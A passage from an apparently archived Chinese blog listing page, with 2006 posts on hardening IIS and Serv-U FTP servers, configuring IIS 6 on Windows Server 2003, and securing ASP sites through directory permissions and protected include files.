+ＦＴＰ最大的安全漏洞在于其默认传输密码的过程是明文传送，很容易被人嗅探到。而ＩＩＳ又是基于Ｗｉｎｄｏｗｓ用户账户进行管理的，因而很容易泄漏系统账户名及密码，如果该账户拥有一定管理权限，则更会影响到整个系统的安全。设置为“只允许匿名连接”，可以免却传输过程中泄密的危险。进入“默认ＦＴＰ站点”，在属性的“安全账户”选项卡中，将此选项选中。
+４）谨慎设置主目录及其权限
+ＩＩＳ可以将ＦＴＰ站点主目录设为局域网中另一台计算机的共享目录，但在局域网中，共享目录很容易招致其他计算机感染的病毒攻击，严重时甚至会造成整个局域网瘫痪，不到万不得已，最好使用本地目录并将主目录设为ＮＴＦＳ格式的非系统分区中。这样，在对目录的权限设置时，可以对每个目录按不同组或用户来设置相应的权限。右击要设置的目录，进入“共享和安全→安全”中设置，如非必要，不要授予“写入”权限。 ５）尽量不要使用默认端口号２１
+启用日志记录，以备出现异常情况时查询原因。
+２．Ｓｅｒｖ－Ｕ的安全性设置
+与ＩＩＳ的ＦＴＰ服务相比，Ｓｅｒｖ－Ｕ在安全性方面做得比较好。
+１）对“本地服务器”进行设置
+首先。选中“拦截ＦＴＰ＿ｂｏｕｎｃｅ攻击和ＦＸＰ”。什么是ＦＸＰ呢？通常，当使用ＦＴＰ协议进行文件传输时，客户端首先向ＦＴＰ服务器发出一个“ＰＯＲＴ”命令，该命令中包含此用户的ＩＰ地址和将被用来进行数据传输的端口号，服务器收到后，利用命令所提供的用户地址信息建立与用户的连接。大多数情况下，上述过程不会出现任何问题，但当客户端是一名恶意用户时，可能会通过在ＰＯＲＴ命令中加入特定的地址信息，使ＦＴＰ服务器与其它非客户端的机器建立连接。虽然这名恶意用户可能本身无权直接访问某一特定机器，但是如果ＦＴＰ服务器有权访问该机器的话，那么恶意用户就可以通过ＦＴＰ服务器作为中介，仍然能够最终实现与目标服务器的连接。这就是ＦＸＰ，也称跨服务器攻击。选中后就可以防止发生此种情况。
+其次，在“高级”选项卡中，检查“加密密码”和“启用安全”是否被选中，如果没有，选择它们。“加密密码”使用单向ｈａｓｈ函数（ＭＤ５）加密用户口令，加密后的口令保存在ＳｅｒｖＵＤａｅｍｏｎ．ｉｎｉ或是注册表中。如果不选择此项，用户口令将以明文形式保存在文件中；“启用安全”将启动Ｓｅｒｖ－Ｕ服务器的安全成功。
+２）对域中的服务器进行设置
+前面说过，ＦＴＰ默认为明文传送密码，容易被人嗅探，对于只拥有一般权限的账户，危险并不大，但如果该账户拥有远程管理尤其是系统管理员权限，则整个服务器都会被别人远程控制。Ｓｅｒｖ－Ｕ对每个账户的密码都提供了以下三种安全类型：规则密码、ＯＴＰ Ｓ／ＫＥＹ ＭＤ４和ＯＴＰ Ｓ／ＫＥＹ ＭＤ５。不同的类型对传输的加密方式也不同，以规则密码安全性最低。进入拥有一定管理权限的账户的设置中，在“常规”选项卡的下方找到“密码类型”下拉列表框，选中第二或第三种类型，保存即可。注意，当用户凭此账户登录服务器时，需要ＦＴＰ客户端软件支持此密码类型，如ＣｕｔｅＦＴＰ Ｐｒｏ等，输入密码时选择相应的密码类型方可通过服务器验证。
+与ＩＩＳ一样，还要谨慎设置主目录及其权限，凡是没必要赋予写入等能修改服务器文件或目录权限的，尽量不要赋予。最后，进入“设置”，在“日志”选项卡中将“启用记录到文件”选中，并设置好日志文件名及保存路径、记录参数等，以方便随时查询服务器异常原因。
+好了，开通你的ＦＴＰ吧。告诉大家：你当站长了。</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 07:57:21 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to FTP服务器架设－－安全篇" href="http://example.org/2006/02/25/ftpe69c8de58aa1e599a8e69eb6e8aebeefbc8defbc8de5ae89e585a8e7af87-2/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>配置 Windows Server 2003-IIS 6
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>配置 Windows Server 2003 – IIS 6 Microsoft Knowledge Base Article - 324742 这篇文章中的信息适用于: Microsoft Windows Server 2003, Datacenter Edition Microsoft Windows Server 2003, Enterprise Edition Microsoft Windows Server 2003, Standard Edition Microsoft Windows Server 2003, Web Edition Microsoft Windows Server 2003, 64-Bit Datacenter Edition Microsoft Windows Server 2003, 64-Bit Enterprise Edition Microsoft Internet Information Services version 6.0
+本分步指南介绍了如何在 Windows Server 2003 环境中设置一个用于匿名访问的 WWW 服务器。
+安装 Internet 信息服务
+Microsoft Internet 信息服务 (IIS) 是与 Windows Server 2003 集成的 Web 服务。...</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 07:50:56 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to 配置 Windows Server 2003-IIS 6" href="http://example.org/2006/02/25/ftpe69c8de58aa1e599a8e69eb6e8aebeefbc8defbc8de5ae89e585a8e7af87/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>安全维护 IIS asp 站点的高级技巧
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>一. 前言
+（仅以此文感谢好友bigeagle。不是他，我可能不用这么担心win2000安全问题的。呵呵！）
+人说，一朝被蛇咬，十年怕…..，就是这样。2000年初，当我终于摆脱winnt 4.0 server那可怕的补丁之旅，迈向win2000 server时。我终于可以比较放心我的服务器了。但随着SQL SERVER的补丁出现。我知道，与微软的补丁因缘又开始轮回了。但还好。win2000自动化的管理还是让我放心好多，而以前管理winnt后的失眠症状也逐渐消失了。偶尔还能见到我的&#34;梦&#34;老弟。但这一切都伴随者同bigeagle的一次知心交谈中付之东流了。一次，bigeagle发来qq，给我看了一段代码。我一看就知道这不是bigeagle写的代码，那么烂，不过有点熟悉。再一看，啊？！这不是我的数据库连接字符串吗！！GOD。顿时觉得有一种不祥的预兆。不过还好，这个只是个access的，我还用了一些手段防止他被下载。但这足以让我长时间的失眠又来了。（再次说明，bigeagle不是蛇，他是鹰）
+二. 安装过程中的IIS 与 ASP安全防护
+（这里只考虑是Web服务器，而不是本地机子上的web开发平台。） 接下来的几天有是几个难熬的日子。我开始重新部署win2000 web服务器的安全策略。找到ASP代码被泄漏的原因。原来，我的补丁每次打得都比较及时的。但一次因为卸载FTP时，重装了IIS，而这之后，我并没有再打补丁而导致最新的漏洞web解析出错。（就是那个较新的漏洞 Translate :f， 用这个加上一些工具就可以看到ASP的代码了。）
+首先，开始重装IIS。
+这次安装的策略就是安全，够用。去掉一些多余的东西。
+1. FTP不要安装了，功能不好，还容易出错，并且漏洞很大。Ftp缺省传输密码的过程可是明文传送，很容易被人截获。（可以考虑用第三方工具。）
+2. 一切实例、文档也不要安装了。这是在web服务器上，最好不要这些例子，事实证明可以从这些例子站点突破IIS的防线的。
+3. 安装时选择站点目录，建议不要用缺省目录c:\inetpub，最好安装道不是系统盘的盘上。如： d:\IISWEB，可以考虑自建目录。这样即使IIS被突破，也能尽可能的保护好系统文件了。
+4. 不要安装html的远程管理。html的远程管理在winnt 4.0还能用的上，但漏洞比较大，而且比较危险，端口号虽然是随机的，但很容易被人扫描道，从而留下隐患。事实上，我们可以通过另一台服务器上的IIS来管理他。这样比较安全。
+5. 多余的服务也不要安了，如NNtp，如果不做新闻组。就不要安了。smtp，如果有更好的邮件服务，也不要装它了。
+6. 索引服务器。这个索引真的是很有用，但我没有用过他。否则，你可以用他建立个整个站点的文件搜索的，但现在好像大多数的ASP网页都是一个网页，动态从数据库里查询。所以根本用不上索引服务器了，（不是索引不好，而是本身上面的那种ASP文件结构就不适合）所以可以不要安装。
+三. 有目的进行安全配置
+①、开发前的工作。
+首先，启动IIS后，看有没有\iissamples,\IIShelp,\msadc,这些目录，如果有，他们大多是用来作为例子，帮助安装的，删掉他们，再把脚本库也删掉，直到web目录只留下干静的新建的虚拟目录即可。如果有管理的web站点，也删掉他。没有它，我们一样可以工作的更好。 还有看看有没有printer的文件夹，他们大多数都是些通过web来访问打印机的。MS就是怪。为了表示我的功力强大，允许通过web来远程打印。相信没有哪个网络公司是通过web网来打印的把。也不可能让网友来使用你的计算机吧。那好，去掉它。
+然后。开始详细配置各个web虚拟目录的安全。大概的策略是这样的。分类每个文件夹管理，如可以把扩展名是相同的分配到同一目录，如*.ASP的，和*.inc就尽量分开。如果是*.ASP的，则开放虚拟目录权限，但将实际目录权限授予administrator,system(完全控制)everyone (rc)即可。这样可以通过web允许读取。但实际上你可以加大安全力度，如果你认为它是比较保密的。如果是*.inc的，则开放目录权限，但不允许通过直接访问。这里又一个技巧了。比如，你可以允许实际目录被everyone访问，但在IIS中，你把改目录浏览项去掉，而包含文件只能被源文件读取，但不允许被直接读取。这样，黑客就不可能下载到你的单机数据库了，而且你的*.inc文件也不会被浏览器直接阅读。
+刚才我的老弟&#34;梦&#34;还在问我，有没有办法可以让别人看不到你的连接字符串，你可以试试下面的方法！ 1 首先建立连接字符串，并建立一个单独的文件*.inc（要是*.inc的，不要*.ASP的）你把你的连接字符串用变量复制进来。
+如：connstr=““Provider=SQLOLEDB.1;Password=passw;………………..”
+2 然后建立一个文件夹include，放在根目录里。
+3 然后每一个文件用下面的办法打开连接。
+如： set conn=server.createobject(“adodb.connection”) conn.open connstr
+4 最后在iis里把include 文件夹用拒绝读的方法保护起来。你会发现，你的连接可以照常打开，但是如果对方看到你的源代码，他也看不到连接字符串，即使他看到了包含文件路径及名称。他也无法下载，或是用ie 打开。所以，可以保护你的连接字符串了。
+这里用的方法是NT权限与 IIS权限的共同审核。我们知道，为了让用户从web上访问道服务器的文件，每个安装了IIS后的服务器都会有两个内置账号。I_USExxxxxx，I_WAMxxxxxx（x为你的机器名），这样你就可以有的放矢地预防某些从你的web网络查看你的必要信息的用户了。
+当然，还有一些比较好的文件策略你可以参考一下：
+如：CGI (.exe, .dll, .cmd, .pl)Everyone (X)不允许读，只能运行。Administrators（完全控制）System（完全控制）。
+所以，你在编写ASP应用程序时，尽量归类好你的目录。方便用IIS和NT进行管理。
+如，采用下列结构比较好
+d:\web\ASPtest\static (放置*....</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 03:36:42 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to 安全维护 IIS asp 站点的高级技巧" href="http://example.org/2006/02/25/e5ae89e585a8e7bbb4e68aa4-iis-asp-e7ab99e782b9e79a84e9ab98e7baa7e68a80e5b7a7/"></a>
+</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="prev" href="http://example.org/page/35/">
+      «&nbsp;Prev&nbsp;
+    </a>
+    <a class="next" href="http://example.org/page/37/">Next&nbsp;&nbsp;»
+    </a>
+  </nav>
+</footer>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="http://example.org/">白天’s Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
